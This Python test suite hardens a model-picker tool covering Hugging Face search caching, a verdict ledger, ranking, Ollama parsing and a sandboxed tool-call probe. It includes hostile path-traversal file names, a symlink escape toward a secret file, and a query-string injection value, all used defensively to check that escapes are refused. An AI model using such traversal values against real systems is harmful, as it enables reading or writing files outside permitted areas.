"""Break PR 2 on purpose: badges, Hugging Face search and cache, ledger, probe, menu and --probe.
Every test asserts the SAFE behaviour. A failing test is a real bug. Everything is faked: no network, no real home."""
import contextlib
import io
import json
import os
import sys
import tempfile
import unittest
import urllib.error
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "tests"))
import capabilities  # noqa: E402
import hf_search  # noqa: E402
import ledger  # noqa: E402
import model_wizard  # noqa: E402
import ollama_library  # noqa: E402
import ollama_models  # noqa: E402
import probe  # noqa: E402
import ranking  # noqa: E402
import run  # noqa: E402
import test_hf_search  # noqa: E402  (module imports only, so their tests are not collected here)
import test_pick_badges  # noqa: E402
import test_probe  # noqa: E402
import test_run  # noqa: E402

T0 = 1_800_000_000.0
URL = "https://huggingface.co/api/models?x=1"

def expected_failure_on_windows(test):
    """Group B, issue #39: this gap only shows on Windows (an extreme timestamp raises OSError there). Linux already
    passes, and an expected failure that passes counts as a failure, so only mark it where it really fails."""
    return unittest.expectedFailure(test) if sys.platform == "win32" else test



class _Reply:
    def __init__(self, body, headers=None):
        self.body = body if isinstance(body, bytes) else json.dumps(body).encode("utf-8")
        self.read_sizes = []

    def read(self, n=None):
        self.read_sizes.append(n)
        return self.body

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False


def too_many(headers=None):
    return urllib.error.HTTPError(URL, 429, "slow down", headers or {}, io.BytesIO(b""))


class Net:
    def __init__(self, *script):
        self.script, self.requests, self.replies = list(script), [], []

    def __call__(self, request, timeout=None):
        self.requests.append(request)
        item = self.script.pop(0)
        if isinstance(item, BaseException):
            raise item
        r = _Reply(item)
        self.replies.append(r)
        return r


class Tmp(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.home = Path(self._tmp.name)
        self.cache = self.home / "cache"
        self.clock = [T0]
        self.slept = []

    def fetch(self, net, url=URL, **kw):
        return hf_search.fetch_json(url, cache_dir=self.cache, now=lambda: self.clock[0], opener=net,
                                    sleep=self.slept.append, **kw)

    def search(self, net, query=None, **kw):
        return hf_search.search_models(self.cache, query=query, now=lambda: self.clock[0], opener=net,
                                       sleep=self.slept.append, **kw)


# ---------------------------------------------------------------- Hugging Face fetch, cache, back-off
class HfFetch(Tmp):
    def test_retry_after_nan_never_reaches_sleep_as_nan(self):
        net = Net(too_many({"Retry-After": "nan"}), [])
        self.fetch(net)
        for s in self.slept:
            self.assertEqual(s, s, "sleep() was handed NaN (time.sleep raises ValueError on it)")

    def test_retry_after_negative_inf_huge_date_and_missing_are_all_bounded(self):
        for value in ("-5", "-inf", "inf", "1e999", "Wed, 21 Oct 2026 07:28:00 GMT", "", None):
            with self.subTest(value=value):
                self.slept.clear()
                headers = {} if value is None else {"Retry-After": value}
                net = Net(too_many(headers), [])
                data, source = self.fetch(net)
                self.assertEqual(source, "net")
                self.assertTrue(all(0 <= s <= hf_search.MAX_WAIT for s in self.slept), self.slept)
                self.clock[0] += 10 * 24 * 3600  # expire the cache for the next subtest

    def test_a_200_with_a_json_object_instead_of_a_list_is_empty_not_a_crash(self):
        rows, source = self.search(Net({"error": "rate limited"}))
        self.assertEqual(rows, [])

    def test_a_200_error_object_does_not_overwrite_a_good_stale_cache(self):
        good = [{"id": "u/r", "pipeline_tag": "text-generation"}]
        self.search(Net(good))
        self.clock[0] += hf_search.CACHE_TTL + 10
        rows, source = self.search(Net({"error": "oops"}))
        self.assertEqual([r["repo"] for r in rows], ["u/r"])  # AMBIGUOUS: could also be []; see report

    def test_the_error_object_is_not_served_from_cache_for_24h(self):
        self.search(Net({"error": "oops"}))
        rows, _ = self.search(Net([{"id": "u/r", "pipeline_tag": "text-generation"}]))
        self.assertEqual([r["repo"] for r in rows], ["u/r"])

    def test_cache_shapes_that_are_not_a_cache_are_ignored(self):
        url = URL
        path = hf_search.cache_path(url, self.cache)
        self.cache.mkdir(parents=True)
        for junk in ("", "[]", "[1,2]", "null", '{"fetchedAt": "x", "data": []}', '{"fetchedAt": NaN, "data": [1]}',
                     '{"data": [1]}', '{"fetchedAt": %s}' % T0, '{"fetchedAt": %s, "data": null}' % T0, "\x00\x00"):
            with self.subTest(junk=junk):
                path.write_text(junk, encoding="utf-8")
                net = Net([{"id": "fresh/x"}])
                data, source = self.fetch(net)
                self.assertEqual((data, source), ([{"id": "fresh/x"}], "net"))

    def test_a_cache_stamped_exactly_24h_ago_is_refetched_and_one_second_younger_is_served(self):
        self.fetch(Net(["old"]))
        self.clock[0] = T0 + hf_search.CACHE_TTL
        self.assertEqual(self.fetch(Net(["new"])), (["new"], "net"))
        self.fetch(Net(["old"]))  # re-stamp at the current clock
        self.clock[0] += hf_search.CACHE_TTL - 1
        self.assertEqual(self.fetch(Net())[1], "cache")

    def test_clock_skew_a_future_cache_is_replaced_and_a_failed_fetch_does_not_serve_it_as_stale(self):
        self.fetch(Net(["future"]))
        self.clock[0] = T0 - 3 * 3600
        data, source = self.fetch(Net(urllib.error.URLError("down")))
        self.assertEqual(source, "offline")

    def test_the_hf_token_never_reaches_the_cache_files_or_an_exception(self):
        secret = "hf_SECRET_TOKEN_123"
        net = Net([{"id": "u/r"}])
        self.fetch(net, token=secret)
        self.assertEqual(net.requests[0].get_header("Authorization"), "Bearer " + secret)
        for p in self.home.rglob("*"):
            if p.is_file():
                self.assertNotIn(secret, p.read_text(encoding="utf-8", errors="replace"))
        self.assertIn(secret, str(net.requests[0].header_items()))  # sent, as intended
        # and a failing request does not echo it either
        net2 = Net(urllib.error.URLError("boom " + "x"))
        data, source = self.fetch(net2, url=URL + "2", token=secret)
        self.assertEqual(source, "offline")

    def test_the_response_read_is_bounded(self):
        net = Net([{"id": "u/r"}])
        self.fetch(net)
        self.assertIsNotNone(net.replies[0].read_sizes[0], "resp.read() has no size cap: a huge reply is read whole")

    def test_a_cache_path_that_is_a_directory_or_a_file_in_the_way_still_gives_data(self):
        self.cache.mkdir(parents=True)
        hf_search.cache_path(URL, self.cache).mkdir()
        self.assertEqual(self.fetch(Net([1])), ([1], "net"))
        (self.home / "afile").write_text("x")
        data, source = hf_search.fetch_json(URL, cache_dir=self.home / "afile" / "sub", now=lambda: T0,
                                            opener=Net([2]), sleep=lambda s: None)
        self.assertEqual((data, source), ([2], "net"))


# ---------------------------------------------------------------- search url, rows
class HfSearch(Tmp):
    def test_awkward_queries_make_a_well_formed_url_with_a_stable_cache_key(self):
        import urllib.parse
        for q in ("café 日本語 \U0001f600", "a&b=c", "x#frag", "a[]=b", "q" * 5000, "  ", "expand[]=evil&limit=999"):
            with self.subTest(q=q[:20]):
                url = hf_search.search_url(q)
                self.assertTrue(url.isascii())
                self.assertNotIn("#", url)
                self.assertNotIn(" ", url)
                parsed = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
                self.assertEqual(parsed["limit"], ["20"])
                self.assertEqual(parsed["expand[]"], list(hf_search.EXPAND))
                self.assertEqual(parsed["search"], [q])
                self.assertEqual(hf_search.cache_path(url, self.cache), hf_search.cache_path(hf_search.search_url(q), self.cache))

    def test_a_query_with_a_lone_surrogate_does_not_crash(self):
        try:
            rows, source = self.search(Net([]), query="bad\udc80byte")
        except Exception as exc:  # noqa: BLE001
            self.fail(f"search_models raised {type(exc).__name__}: {exc}")
        self.assertEqual(rows, [])

    def test_rows_with_junk_field_types_never_crash_and_always_have_a_string_repo(self):
        data = [{"id": 5}, {"id": ["a", "b"]}, {"id": {"x": 1}}, {"modelId": 7}, {"id": "ok/one", "pipeline_tag": ["x"]},
                {"id": "ok/two", "pipeline_tag": {"a": 1}}, {"id": "ok/three", "pipeline_tag": 5, "gguf": [1]},
                {"id": "ok/four", "gguf": {"chat_template": ["tools"]}, "downloads": True}, "string", None, 3, ["x"]]
        try:
            rows, _ = self.search(Net(data))
        except Exception as exc:  # noqa: BLE001
            self.fail(f"search_models raised {type(exc).__name__}: {exc}")
        for r in rows:
            self.assertIsInstance(r["repo"], str, r)

    def test_a_bool_download_count_is_not_shown_as_a_number(self):
        rows, _ = self.search(Net([{"id": "u/r", "downloads": True}]))
        self.assertIsNone(rows[0]["downloads"])


# ---------------------------------------------------------------- ledger
class Ledger(Tmp):
    def entries(self):
        return ledger.read(home=self.home, env={})

    def add(self, ref, verdict="fail", reason="r", **kw):
        return ledger.append(ref, verdict, reason, home=self.home, env={}, **kw)

    def test_missing_corrupt_empty_and_directory_ledgers_read_as_empty(self):
        self.assertEqual(self.entries(), [])
        path = ledger.ledger_path(self.home, {})
        path.parent.mkdir(parents=True, exist_ok=True)
        for blob in (b"", b"\x00\x00\x00", b"{not json", b"[]\n[1]\nnull\n42\n\"s\"\n", b"\xff\xfe\xfa"):
            path.write_bytes(blob)
            self.assertEqual(self.entries(), [], blob)
        path.unlink()
        path.mkdir()
        self.assertEqual(self.entries(), [])

    def test_one_bad_byte_does_not_wipe_the_good_entries(self):
        self.add("good:1", "fail")
        with open(ledger.ledger_path(self.home, {}), "ab") as f:
            f.write(b"\xff\xfe junk line\n")
        self.add("other:1", "pass")
        self.assertEqual([e["modelRef"] for e in self.entries()], ["good:1", "other:1"])

    def test_a_truncated_last_line_without_a_newline_does_not_swallow_the_next_entry(self):
        self.add("a:1", "pass")
        with open(ledger.ledger_path(self.home, {}), "ab") as f:
            f.write(b'{"modelRef":"half')  # crash mid-write, no newline
        self.add("b:1", "fail")
        self.assertIn("b:1", [e["modelRef"] for e in self.entries()])

    def test_an_entry_whose_text_holds_u2028_or_nel_is_still_one_readable_line(self):
        for ref in ("a b:1", "a\x85b:1", "a b:1", "a\x0cb:1", "a\x1cb:1"):
            with self.subTest(ref=repr(ref)):
                self.add(ref, "fail")
                self.assertIn(ref, [e["modelRef"] for e in self.entries()])

    def test_append_never_raises_on_a_lone_surrogate(self):
        try:
            ok, msg = self.add("bad\udcffref:1", "fail", reason="why\ud800")
        except Exception as exc:  # noqa: BLE001
            self.fail(f"append raised {type(exc).__name__}: {exc}")
        self.assertIsInstance(ok, bool)

    def test_append_to_an_unwritable_home_warns_and_never_raises(self):
        blocker = self.home / "blocker"
        blocker.write_text("i am a file")
        ok, msg = ledger.append("a:1", "fail", "r", home=blocker / "sub", env={})
        self.assertFalse(ok)
        self.assertIn("carrying on", msg)

    def test_case_and_latest_do_not_split_a_model_into_two(self):
        self.add("Qwen3:8B", "fail")
        e = self.entries()
        self.assertEqual(ledger.status("qwen3:8b", e), "fail")
        self.add("llama3", "fail")
        self.assertEqual(ledger.status("LLAMA3:latest", self.entries()), "fail")
        self.assertEqual(ledger.status("  llama3:LATEST ", self.entries()), "fail")

    def test_two_entries_with_the_same_timestamp_later_line_wins(self):
        self.add("m:1", "fail", now=T0)
        self.add("m:1", "pass", now=T0)
        self.assertEqual(ledger.status("m:1", self.entries()), "pass")
        self.add("m:1", "fail", now=T0)
        self.assertEqual(ledger.status("m:1", self.entries()), "fail")

    def test_ten_thousand_lines_read_fast_and_the_latest_wins(self):
        path = ledger.ledger_path(self.home, {})
        path.parent.mkdir(parents=True, exist_ok=True)
        lines = [json.dumps({"modelRef": f"m{i % 50}:1", "verdict": "fail", "timestampUtc": "2026-01-01T00:00:00Z"}) for i in range(10000)]
        lines.append(json.dumps({"modelRef": "m3:1", "verdict": "pass", "timestampUtc": "2026-01-02T00:00:00Z"}))
        path.write_text("\n".join(lines) + "\n", encoding="utf-8")
        e = self.entries()
        self.assertEqual(len(e), 10001)
        self.assertEqual(ledger.status("m3:1", e), "pass")
        self.assertEqual(ledger.status("m4:1", e), "fail")

    def test_odd_verdicts_and_refs_are_skipped_not_crashed_on(self):
        path = ledger.ledger_path(self.home, {})
        path.parent.mkdir(parents=True, exist_ok=True)
        rows = [{"modelRef": ["a"], "verdict": "pass"}, {"modelRef": "a:1", "verdict": ["pass"]},
                {"modelRef": "a:1", "verdict": {"x": 1}}, {"modelRef": None, "verdict": "fail"}, {"verdict": "fail"},
                {"modelRef": 5, "verdict": "pass"}, {"modelRef": "ok:1", "verdict": "fail"}]
        path.write_text("\n".join(json.dumps(r) for r in rows), encoding="utf-8")
        self.assertEqual([e["modelRef"] for e in self.entries()], ["ok:1"])

    # Group B: left open on purpose, see issue #39
    @expected_failure_on_windows
    def test_fresh_pass_survives_weird_timestamps(self):
        for stamp in ("0001-01-01T00:00:00", "0001-01-01T00:00:00Z", "9999-12-31T23:59:59", "9999-12-31T23:59:59Z",
                      "garbage", None, 5, ["x"], "", "2026-13-01T00:00:00Z", "1e999"):
            with self.subTest(stamp=stamp):
                e = [{"modelRef": "m:1", "verdict": "pass", "timestampUtc": stamp}]
                try:
                    self.assertFalse(ledger.fresh_pass("m:1", e, now=T0))
                except Exception as exc:  # noqa: BLE001
                    self.fail(f"fresh_pass raised {type(exc).__name__}: {exc}")

    def test_fresh_pass_edges_exactly_ttl_and_from_the_future(self):
        e = [{"modelRef": "m:1", "verdict": "pass", "timestampUtc": ledger._stamp(T0)}]
        self.assertTrue(ledger.fresh_pass("m:1", e, now=T0 + ledger.PASS_TTL_SECONDS))
        self.assertFalse(ledger.fresh_pass("m:1", e, now=T0 + ledger.PASS_TTL_SECONDS + 1))
        self.assertFalse(ledger.fresh_pass("m:1", e, now=T0 - 1))  # clock skew: not trusted

    def test_a_reason_is_capped_and_a_newline_stays_inside_its_line(self):
        self.add("m:1", "fail", reason="line1\nline2\r\n" + "x" * 5000)
        text = ledger.ledger_path(self.home, {}).read_text(encoding="utf-8")
        self.assertEqual(len(text.splitlines()), 1)
        self.assertLessEqual(len(self.entries()[0]["reason"]), ledger.REASON_CAP)


# ---------------------------------------------------------------- capabilities and ranking
class Caps(unittest.TestCase):
    # Left open on purpose: contradicts an existing test, see the issue #39 follow-up
    @unittest.expectedFailure
    def test_capabilities_that_are_not_a_list_of_known_words_mean_unknown_not_no_tools(self):
        for junk in ("tools", {"tools": True}, 5, [1, None, {}], [["tools"]]):
            with self.subTest(junk=junk):
                self.assertIsNone(capabilities.ollama_badges(junk))
                self.assertIn(capabilities.kind_from_ollama(junk), ("unknown",))

    def test_unhashable_pipeline_tags_do_not_crash_hf_badges_or_kind(self):
        for tag in (["image-text-to-text"], {"a": 1}, 5, None, ""):
            with self.subTest(tag=tag):
                capabilities.hf_badges(tag, None)
                capabilities.kind_from_hf(tag)

    def test_embedding_and_media_kinds(self):
        self.assertEqual(capabilities.kind_from_ollama(["embedding"]), "embedding")
        self.assertEqual(capabilities.kind_from_ollama(["completion", "embedding"]), "chat")
        self.assertEqual(capabilities.kind_from_ollama(["image"]), "media")
        self.assertEqual(capabilities.kind_from_ollama([]), "unknown")
        self.assertEqual(capabilities.resolve_kind("unknown", "nomic-embed-text:latest"), "embedding")

    def test_format_badges_tolerates_non_strings(self):
        try:
            text = capabilities.format_badges(("tools", 5, None))
        except Exception as exc:  # noqa: BLE001
            self.fail(f"format_badges raised {type(exc).__name__}: {exc}")
        self.assertIn("tools", text)

    def test_a_huge_chat_template_only_counts_its_head(self):
        t = "x" * capabilities.TEMPLATE_CAP + " tools <think>"
        self.assertEqual(capabilities.hf_badges("text-generation", t), ())


class Ranks(unittest.TestCase):
    def test_a_model_that_failed_is_still_returned_when_it_is_the_only_one(self):
        c = [{"tag": "qwen3:8b", "kind": "chat", "ledger": "fail", "badges": ("tools",)}]
        self.assertEqual(ranking.best_for_agent(c)["tag"], "qwen3:8b")

    def test_embedding_and_media_are_never_the_winner_whatever_else_they_score(self):
        c = [{"tag": "nomic-embed-text", "kind": "embedding", "badges": ("tools",), "installed": True, "ledger": "pass",
              "fit": "gpu", "downloads": 10 ** 9, "name_score": 10 ** 6},
             {"tag": "x/flux", "kind": "media", "fit": "gpu"},
             {"tag": "mystery-embed:1", "kind": "unknown"},
             {"tag": None, "kind": None}]
        self.assertEqual([x["tag"] for x in ranking.agent_candidates(c)], [None])
        self.assertIsNone(ranking.best_for_agent(c[:3]))

    def test_junk_field_values_never_crash_the_key(self):
        c = {"tag": "m:1", "kind": "chat", "fit": ["gpu"], "badges": 5, "last_modified": ["x"], "downloads": "9",
             "size_gb": float("nan"), "name_score": float("inf"), "ledger": ["fail"]}
        try:
            ranking.rank_key(c)
        except Exception as exc:  # noqa: BLE001
            self.fail(f"rank_key raised {type(exc).__name__}: {exc}")

    def test_extreme_dates_do_not_crash(self):
        for v in ("0001-01-01T00:00:00", "9999-12-31T23:59:59-05:00", "9999-12-31T23:59:59+14:00", "2026-11-01T00:00:00.123456789Z"):
            ranking.epoch(v)

    def test_full_tie_is_input_order_and_stable(self):
        a = {"tag": "a:1", "kind": "chat"}
        b = {"tag": "b:1", "kind": "chat"}
        self.assertEqual(ranking.best_for_agent([a, b])["tag"], "a:1")
        self.assertEqual(ranking.best_for_agent([b, a])["tag"], "b:1")


# ---------------------------------------------------------------- ollama_models, library
class FakeOllama:
    def __init__(self, tags, shows=None):
        self.tags, self.shows, self.show_calls = tags, shows or {}, 0

    def __call__(self, request, timeout=None):
        if request.full_url.endswith("/api/tags"):
            return _Reply(self.tags)
        self.show_calls += 1
        body = json.loads(request.data)
        return _Reply(self.shows.get(body["model"], {}))


class OllamaModels(unittest.TestCase):
    def test_capabilities_as_string_dict_or_junk_list(self):
        tags = {"models": [{"name": "a:1", "capabilities": "tools"}, {"name": "b:1", "capabilities": {"x": 1}},
                           {"name": "c:1", "capabilities": [1, None, "tools"]}, {"name": "d:1"}]}
        det = ollama_models.installed_details(opener=FakeOllama(tags))
        self.assertIsNone(det["a:1"]["caps"])
        self.assertIsNone(det["b:1"]["caps"])
        self.assertEqual(det["c:1"]["caps"], ["tools"])
        self.assertIsNone(det["d:1"]["caps"])  # old Ollama: unknown, never "none"

    def test_a_junk_capabilities_list_is_unknown_not_empty(self):
        tags = {"models": [{"name": "c:1", "capabilities": [1, None, {}]}]}
        det = ollama_models.installed_details(opener=FakeOllama(tags))
        self.assertIsNone(det["c:1"]["caps"])

    def test_show_calls_are_capped_with_five_hundred_models(self):
        fake = FakeOllama({"models": [{"name": f"m{i}:1"} for i in range(500)]})
        det = ollama_models.installed_details(opener=fake)
        self.assertEqual(len(det), 500)
        self.assertLessEqual(fake.show_calls, ollama_models.MAX_SHOW_CALLS)

    def test_tags_of_the_wrong_shape_give_empty(self):
        for payload in ([], "x", {"models": "x"}, {"models": [None, 5, "s", {"name": 5}, {"name": ""}]}, None):
            self.assertEqual(ollama_models.installed_details(opener=FakeOllama(payload)), {})

    def test_a_short_name_does_not_borrow_the_details_of_another_namespace(self):
        det = {"acme/foo:1": {"name": "acme/foo:1", "caps": ["embedding"], "size_gb": 1, "modified_at": None}}
        self.assertIsNone(ollama_models.lookup(det, "foo:1"))
        det2 = {"hf.co/u/foo:q4": {"name": "hf.co/u/foo:q4", "caps": ["completion"], "size_gb": 1, "modified_at": None}}
        self.assertIsNotNone(ollama_models.lookup(det2, "foo:q4"))


class Library(unittest.TestCase):
    def test_an_unclosed_li_flood_does_not_take_quadratic_time(self):
        import subprocess
        code = "import ollama_library as l; l.parse_library('<li>' * 100000)"
        try:
            subprocess.run([sys.executable, "-I", "-c", "import sys; sys.path.insert(0, %r); %s" % (str(ROOT), code)],
                           timeout=15, check=True, stdin=subprocess.DEVNULL, capture_output=True)
        except subprocess.TimeoutExpired:
            self.fail("parse_library took over 15 s on 400 KB of unclosed <li> (quadratic regex); the cap is 3 MB")

    def test_three_megabytes_of_junk_is_an_empty_list_and_a_non_string_too(self):
        self.assertEqual(ollama_library.parse_library("x" * 3_000_000), [])
        for v in (None, b"<li>", 5, ["<li>"]):
            self.assertEqual(ollama_library.parse_library(v), [])

    def test_scan_reads_at_most_the_cap(self):
        net = Net(b"<html></html>")
        ollama_library.scan(opener=net)
        self.assertEqual(net.replies[0].read_sizes, [ollama_library.MAX_BYTES])


# ---------------------------------------------------------------- probe
def _srv(script, **kw):
    return test_probe.FakeServer(script, **kw)


def _probe(script, **kw):
    srv = _srv(script, **{k: kw.pop(k) for k in ("tokens", "tick") if k in kw})
    result = probe.run_probe(test_probe.BASE, "m:1", opener=srv, clock=srv.clock, **kw)
    return result, srv


def _marker(srv):
    return test_probe.marker_from(srv.requests)


def _write_call(path, content="x"):
    return test_probe.msg({"id": "c", "function": {"name": "write_file",
                                                   "arguments": json.dumps({"path": path, "content": content})}})


class Probe(unittest.TestCase):
    def never_raises(self, script, **kw):
        try:
            return _probe(script, **kw)
        except Exception as exc:  # noqa: BLE001
            self.fail(f"run_probe raised {type(exc).__name__}: {exc}")

    def test_a_model_that_answers_in_plain_text_fails_without_leaking(self):
        res, srv = self.never_raises(lambda i, r: test_probe.say('read_file({"path": "seed.md"})'))
        self.assertEqual(res["verdict"], "fail")
        self.assertIn("plain text", res["reason"])

    def test_tool_calls_of_the_wrong_type_fail_cleanly(self):
        for tc in (5, "abc", {"a": 1}, [None, 3, "x"], True):
            with self.subTest(tool_calls=tc):
                res, _ = self.never_raises(lambda i, r, tc=tc: {"role": "assistant", "content": "", "tool_calls": tc})
                self.assertEqual(res["verdict"], "fail")

    def test_a_message_that_is_not_an_object_fails_cleanly(self):
        for m in ("oops", [1], 5):
            with self.subTest(message=m):
                res, _ = self.never_raises(lambda i, r, m=m: m)
                self.assertEqual(res["verdict"], "fail")

    def test_function_that_is_a_string_list_or_none_fails_cleanly(self):
        for fn in ("read_file", ["read_file"], None, 5, {"name": None}, {"name": ["x"], "arguments": 1}):
            with self.subTest(function=fn):
                call = {"id": "c1", "type": "function", "function": fn}
                res, _ = self.never_raises(lambda i, r, call=call: test_probe.msg(call))
                self.assertEqual(res["verdict"], "fail")

    def test_arguments_that_are_a_list_or_garbage_fail_cleanly(self):
        for args in ([1, 2], "[1]", "{broken", "null", 5, None, '"s"'):
            with self.subTest(arguments=args):
                call = {"id": "c1", "function": {"name": "read_file", "arguments": args}}
                res, _ = self.never_raises(lambda i, r, call=call: test_probe.msg(call))
                self.assertEqual(res["verdict"], "fail")

    def test_tool_calls_with_no_id_still_pass_a_good_run(self):
        def script(i, reqs):
            if i == 0:
                return test_probe.msg({"function": {"name": "read_file", "arguments": json.dumps({"path": "seed.md"})}})
            if i == 1:
                m = test_probe.marker_from(reqs)
                return test_probe.msg({"function": {"name": "write_file",
                                                    "arguments": json.dumps({"path": "output.md", "content": m})}})
            return test_probe.say("done")
        res, _ = self.never_raises(script)
        self.assertEqual(res["verdict"], "pass", res)

    def test_token_counts_of_any_type_give_a_speed_or_none_never_a_crash(self):
        for used in (-5, 3.5, "30", None, [], float("nan"), 10 ** 30, True):
            with self.subTest(tokens=used):
                srv = _srv(lambda i, r: test_probe.say("no"), tokens=(used,))
                res = probe.run_probe(test_probe.BASE, "m:1", opener=srv, clock=srv.clock)
                self.assertTrue(res["tok_s"] is None or res["tok_s"] > 0)

    def test_zero_elapsed_and_a_clock_that_goes_backwards_are_safe(self):
        res, _ = self.never_raises(lambda i, r: test_probe.say("no"), tick=0.0, tokens=(50,))
        self.assertIsNone(res["tok_s"])
        res, _ = self.never_raises(lambda i, r: test_probe.say("no"), tick=-5.0, tokens=(50,))
        self.assertIsNone(res["tok_s"])

    def test_the_marker_is_not_in_the_prompt_the_first_request_or_the_result(self):
        srv = test_probe.FakeServer(test_probe.good())
        res = probe.run_probe(test_probe.BASE, "m:1", opener=srv, clock=srv.clock)
        marker = _marker(srv)
        self.assertEqual(res["verdict"], "pass")
        self.assertNotIn(marker, probe.PROMPT)
        self.assertNotIn(marker, json.dumps(srv.requests[0][2]))
        self.assertNotIn(marker, json.dumps(res))

    def test_a_server_error_whose_text_echoes_the_request_does_not_put_the_marker_in_the_reason(self):
        def script(i, reqs):
            if i == 0:
                return test_probe.msg(test_probe.call("read_file", {"path": "seed.md"}))
            return RuntimeError(json.dumps(reqs[-1][2]))
        res, srv = self.never_raises(script)
        self.assertNotIn(_marker(srv), json.dumps(res))

    def test_writing_the_marker_with_extra_text_fails_without_echoing_it(self):
        def script(i, reqs):
            if i == 0:
                return test_probe.msg(test_probe.call("read_file", {"path": "seed.md"}))
            if i == 1:
                return _write_call("output.md", "MARKER=" + test_probe.marker_from(reqs))
            return test_probe.say("done")
        res, srv = self.never_raises(script)
        self.assertEqual(res["verdict"], "fail")
        self.assertNotIn(_marker(srv), res["reason"])

    def test_five_megabytes_of_content_fails_without_a_crash_and_the_folder_is_removed(self):
        made = []
        real = tempfile.mkdtemp

        def spy(*a, **k):
            made.append(real(*a, **k))
            return made[-1]
        with mock.patch.object(probe.tempfile, "mkdtemp", side_effect=spy):
            res, _ = self.never_raises(lambda i, r: _write_call("output.md", "A" * 5_000_000) if i == 0 else test_probe.say("x"))
        self.assertEqual(res["verdict"], "fail")
        self.assertTrue(made and not os.path.exists(made[0]))

    def test_paths_that_escape_are_refused_and_nothing_lands_outside(self):
        with tempfile.TemporaryDirectory() as outer:
            folder = os.path.join(outer, "antigravity-probe-abc")
            sibling = folder + "-evil"
            os.makedirs(sibling)
            hostile = ["../" + os.path.basename(sibling) + "/pwn.txt", "seed.md/../../pwn.txt", "..\\pwn.txt", "/pwn.txt",
                       "C:\\pwn.txt", "C:pwn.txt", "\\\\server\\share\\pwn.txt", "//server/share/pwn.txt", "a\x00b.txt",
                       "../../../../../../../../pwn.txt", 5, ["x"], None, "", "   "]
            for path in hostile:
                with self.subTest(path=path):
                    os.makedirs(folder, exist_ok=True)
                    with mock.patch.object(probe.tempfile, "mkdtemp", return_value=folder):
                        res, _ = self.never_raises(lambda i, r, p=path: _write_call(p) if i == 0 else test_probe.say("x"))
                    self.assertEqual(res["verdict"], "fail", res)
                    for root, _dirs, files in os.walk(outer):
                        self.assertNotIn("pwn.txt", files, root)

    def test_trailing_dots_spaces_and_reserved_names_do_not_crash(self):
        for path in ("output.md.", "output.md ", "output.md...   ", "CON", "nul", "aux.txt", "output.md/", ".", "sub/../output.md", "x" * 100000):
            with self.subTest(path=path[:30]):
                self.never_raises(lambda i, r, p=path: _write_call(p) if i == 0 else test_probe.say("x"))

    def test_a_symlink_in_the_folder_pointing_outside_cannot_be_read_through(self):
        with tempfile.TemporaryDirectory() as outer:
            secret = os.path.join(outer, "secret.txt")
            Path(secret).write_text("TOPSECRET")
            folder = os.path.join(outer, "f")
            os.makedirs(folder)
            try:
                os.symlink(secret, os.path.join(folder, "link.txt"))
            except (OSError, NotImplementedError):
                self.skipTest("this OS refused to create a symlink")
            text, outside = probe._run_tool(folder, "read_file", {"path": "link.txt"})
            self.assertTrue(outside)
            self.assertNotIn("TOPSECRET", text)

    def test_a_server_that_always_asks_for_tools_stops_at_max_calls(self):
        res, srv = self.never_raises(lambda i, r: test_probe.msg(test_probe.call("read_file", {"path": "seed.md"})), tick=0.001)
        self.assertEqual(res["verdict"], "fail")
        self.assertLessEqual(len(srv.requests), 9)

    def test_a_timeout_of_zero_or_negative_fails_without_asking_the_server(self):
        for t in (0, -1):
            srv = _srv(lambda i, r: test_probe.say("x"))
            res = probe.run_probe(test_probe.BASE, "m:1", opener=srv, clock=srv.clock, timeout=t)
            self.assertEqual(res["verdict"], "fail")
            self.assertEqual(srv.requests, [])

    def test_a_base_url_with_a_trailing_slash_or_v1_makes_one_clean_url(self):
        for base in ("http://h:1", "http://h:1/", "http://h:1/v1", "http://h:1/v1/"):
            srv = _srv(lambda i, r: test_probe.say("x"))
            probe.run_probe(base, "m:1", opener=srv, clock=srv.clock)
            self.assertEqual(srv.requests[0][0], "http://h:1/v1/chat/completions")


# ---------------------------------------------------------------- menu, choose, search pick
HW = {"ram_gb": 128.0, "vram_gb": 16.0, "gpu_name": "RTX"}


def _feed(answers):
    it = iter(answers)
    return lambda prompt="": next(it)


class Menu(unittest.TestCase):
    def test_render_survives_non_string_badges_in_any_row_kind(self):
        media = [{"tag": "x/m", "badges": ("image", 5, None), "note": "n", "hint": "h"}]
        library = [{"tag": "lib", "badges": (1, ["x"]), "note": "n"}]
        try:
            menu = model_wizard.build_menu(["a:1"], 16, 128, badges={"a:1": (None, 3)}, library=library, media=media)
            model_wizard.render(menu, "a:1")
        except Exception as exc:  # noqa: BLE001
            self.fail(f"{type(exc).__name__}: {exc}")

    def test_a_badges_string_is_not_split_into_letters(self):
        menu = model_wizard.build_menu([], 16, 128, media=[{"tag": "x/m", "badges": "image", "note": "n", "hint": "h"}])
        text = "\n".join(model_wizard.render(menu, None))
        self.assertNotIn("i, m, a, g, e", text)

    # Left open on purpose: contradicts an existing test, see the issue #39 follow-up
    @unittest.expectedFailure
    def test_five_hundred_media_rows_render_and_the_default_stays_a_chat_model(self):
        media = [{"tag": f"x/img{i}", "badges": ("image",), "note": "n", "hint": f"hint{i}"} for i in range(500)]
        menu = model_wizard.build_menu(["a:1"], 16, 128, media=media)
        out = []
        got = model_wizard.choose(menu, None, input_fn=_feed(["300", ""]), out=out.append)
        self.assertEqual(got, "a:1")
        self.assertIn("hint298", "\n".join(out))

    def test_a_media_row_with_an_empty_or_none_hint_still_explains_itself(self):
        for hint in ("", None):
            media = [{"tag": "x/m", "badges": ("image",), "note": "n", "hint": hint}]
            menu = model_wizard.build_menu(["a:1"], 16, 128, media=media)
            n = [m["tag"] for m in menu].index("x/m") + 1
            out = []
            got = model_wizard.choose(menu, "a:1", input_fn=_feed([str(n), ""]), out=out.append)
            self.assertEqual(got, "a:1")
            self.assertTrue(any("edia" in l for l in out[-2:]), (hint, out[-2:]))

    def test_a_whitespace_hint_prints_something_readable(self):
        media = [{"tag": "x/m", "badges": ("image",), "note": "n", "hint": "   "}]
        menu = model_wizard.build_menu(["a:1"], 16, 128, media=media)
        n = [m["tag"] for m in menu].index("x/m") + 1
        out = []
        model_wizard.choose(menu, "a:1", input_fn=_feed([str(n), ""]), out=out.append)
        self.assertTrue(out[-1].strip(), "an all-blank line was printed as the explanation")

